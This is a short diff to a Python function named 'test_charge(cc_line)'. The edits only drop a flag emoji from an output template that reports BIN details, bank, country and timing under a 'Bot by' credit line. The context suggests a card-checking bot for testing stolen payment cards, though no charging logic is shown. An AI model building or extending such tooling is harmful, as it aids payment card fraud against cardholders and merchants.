@@ -258,7 +258,7 @@ def test_charge(cc_line):
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -361,7 +361,7 @@ def test_charge(cc_line):
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -380,7 +380,7 @@ def test_charge(cc_line):
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} 
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
